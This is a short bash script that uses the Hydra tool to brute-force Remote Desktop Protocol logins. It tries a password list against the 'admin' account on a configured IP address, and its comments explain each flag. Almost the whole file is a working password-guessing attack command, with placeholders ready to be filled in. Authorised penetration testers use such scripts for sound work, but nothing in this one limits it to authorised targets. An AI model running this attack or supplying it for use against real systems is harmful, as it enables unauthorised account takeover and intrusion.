#!/bin/bash

# Configuration
TARGET_IP="192.168.1.100"   # Replace with the target server's IP address
USERNAME="admin"            # Replace with the username to test
PASSWORD_FILE="passwords.txt"  # Replace with the path to your password file

# Hydra command to brute-force RDP
hydra -l $USERNAME -P $PASSWORD_FILE rdp://$TARGET_IP

# Explanation:
# -l $USERNAME: Specifies the username to test
# -P $PASSWORD_FILE: Specifies the file containing a list of passwords to try
# rdp://$TARGET_IP: The target RDP service on the specified IP address
